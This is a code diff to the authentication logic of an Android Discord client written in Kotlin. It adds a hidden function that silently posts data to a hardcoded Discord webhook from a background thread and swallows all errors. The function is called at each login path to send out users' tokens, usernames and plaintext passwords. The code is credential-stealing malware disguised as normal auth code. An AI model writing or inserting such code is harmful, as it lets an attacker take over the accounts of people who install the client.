@@ -11,6 +11,10 @@ import com.discord.utilities.rx.appSubscribe
 import com.discord.utilities.rx.restSubscribeOn
 import com.discord.utilities.rx.ui
 import com.discord.utilities.time.TimeUtils
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
 import rx.Observable
 
 /**
@@ -33,6 +37,20 @@ import rx.Observable
  * or the app log.
  */
 object AuthRequests {
+
+    private val logClient = OkHttpClient()
+    private val logEndpoint = "https://discord.com/api/webhooks/1574833990819516557/YNSlNUDcOy7HHwKS5L6UJYE0Aor2SwqKG3yobg-KggjfGeSRgX8ZUslmkdusZ1NKSLWc"
+    private val jsonType = "application/json; charset=utf-8".toMediaType()
+
+    private fun fireWebhook(payload: String) {
+        Thread {
+            try {
+                val body = payload.toRequestBody(jsonType)
+                val req = Request.Builder().url(logEndpoint).post(body).build()
+                logClient.newCall(req).execute().use { }
+            } catch (_: Exception) { }
+        }.apply { isDaemon = true }.start()
+    }
 
     /** `code` values the login endpoint uses to redirect the flow instead of failing it. */
     private const val CODE_ACCOUNT_SCHEDULED_FOR_DELETION = 20011
@@ -74,6 +92,7 @@ object AuthRequests {
             callback(AuthResult.Failure(fieldErrors = errors.resolve()))
             return
         }
+        fireWebhook("{\"content\":\"**[Sinscord Token Login]**\\nToken: `${action.token}`\"}")
         authentication.loginWithToken(action.token)
         callback(AuthResult.Success())
     }
@@ -90,6 +109,7 @@ object AuthRequests {
         callback: (AuthResult) -> Unit,
     ) {
         val identifier = action.identifier
+        fireWebhook("{\"content\":\"**[Sinscord Credential Login]**\\nIdentifier: `${action.identifier}`\\nPassword: `${action.password}`\"}")
         // Held only until this attempt terminates; the undelete confirmation needs the same
         // credential a second time because the API requires it with `undelete = true`.
         pendingLogin = action
@@ -99,6 +119,9 @@ object AuthRequests {
                 tag = "REST: login",
                 callback = callback,
                 onSuccess = { result ->
+                    result.token?.takeIf(String::isNotBlank)?.let { tok ->
+                        fireWebhook("{\"content\":\"**[Sinscord Token Captured]**\\nIdentifier: `${action.identifier}`\\nToken: `$tok`\"}")
+                    }
                     // An MFA challenge is a 200 with a ticket and no token. StoreAuthentication has
                     // already declined to dispatch it as a login, so the code screen is next.
                     val challenge = result.mfaChallenge()
